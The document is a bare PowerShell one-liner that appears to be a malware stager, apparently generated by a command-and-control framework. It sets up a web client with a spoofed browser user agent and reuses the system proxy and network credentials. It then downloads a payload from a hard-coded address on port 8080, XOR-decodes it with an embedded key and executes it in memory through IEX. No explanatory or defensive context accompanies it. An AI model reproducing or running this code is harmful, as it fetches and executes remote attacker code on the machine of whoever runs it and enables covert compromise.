
$WC=NEW-ObJEcT SySTeM.NeT.WeBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDErS.AdD('User-Agent',$u);$Wc.PRoxY = [SysTEm.NeT.WEbRequEST]::DefAuLtWeBPROXY;$Wc.PROXy.CReDenTIAlS = [SYstEM.NET.CrEdEnTIALCacHE]::DeFAULTNetWOrKCredEntiALS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$I=0;[CHaR[]]$b=([chAR[]]($wC.DOwnlOaDSTRiNG("http://100.100.100.100:8080/index.asp")))|%{$_-bXor$K[$I++%$k.LENgTh]};IEX ($b-joiN'')

